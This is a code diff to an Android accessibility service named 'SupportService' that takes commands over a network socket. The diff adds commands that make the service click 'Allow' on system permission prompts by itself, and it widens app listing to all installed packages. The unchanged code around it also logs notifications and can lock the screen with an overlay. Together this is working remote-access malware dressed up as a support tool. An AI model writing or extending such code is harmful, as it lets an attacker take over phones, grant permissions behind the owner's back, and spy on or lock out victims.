@@ -15,6 +15,7 @@ import android.view.WindowManager;
 import android.view.WindowInsets;
 import android.view.WindowInsetsController;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Button;
 import android.widget.TextView;
 import android.content.SharedPreferences;
@@ -48,6 +49,7 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
+    private boolean autoAllowPermissions = false;
     private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
     private final List<String> notificationLog = Collections.synchronizedList(new ArrayList<>());
 
@@ -110,7 +112,7 @@ public class SupportService extends AccessibilityService {
                     handleCommand(client);
                 }
             } catch (Exception e) {
-                // Server closed or error
+                // Server closed
             }
         }).start();
     }
@@ -240,11 +242,9 @@ public class SupportService extends AccessibilityService {
                 List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                 StringBuilder sb = new StringBuilder();
                 for (ApplicationInfo app : apps) {
-                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                        sb.append(app.packageName).append("\n");
-                    }
+                    sb.append(app.packageName).append("\n");
                 }
-                out.println(sb.toString());
+                out.println(sb.toString().isEmpty() ? "No apps found" : sb.toString());
             } else if (cmdLower.startsWith("launch ")) {
                 String pkg = cmd.substring(7).trim();
                 Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
@@ -253,8 +253,14 @@ public class SupportService extends AccessibilityService {
                     startActivity(i);
                     out.println("OK: Launched " + pkg);
                 } else {
-                    out.println("ERROR: Package not found or not launchable");
+                    out.println("ERROR: Package not found");
                 }
+            } else if (cmdLower.equals("perm on")) {
+                autoAllowPermissions = true;
+                out.println("OK: Auto-Allow Permissions Enabled");
+            } else if (cmdLower.equals("perm off")) {
+                autoAllowPermissions = false;
+                out.println("OK: Auto-Allow Permissions Disabled");
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -361,6 +367,23 @@ public class SupportService extends AccessibilityService {
             String text = event.getText() != null ? event.getText().toString() : "";
             notificationLog.add("[" + pkg + "] " + text);
             if (notificationLog.size() > 50) notificationLog.remove(0);
+        }
+
+        // AUTO-ALLOW PERMISSIONS LOGIC
+        if (autoAllowPermissions && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+            if (pkgName.contains("com.android.permissioncontroller") || pkgName.contains("com.google.android.permissioncontroller")) {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("Allow");
+                    if (nodes == null || nodes.isEmpty()) {
+                        nodes = root.findAccessibilityNodeInfosByText("While using the app");
+                    }
+                    if (nodes != null && !nodes.isEmpty()) {
+                        nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+            }
         }
 
         if (isLocked && overlay != null) {
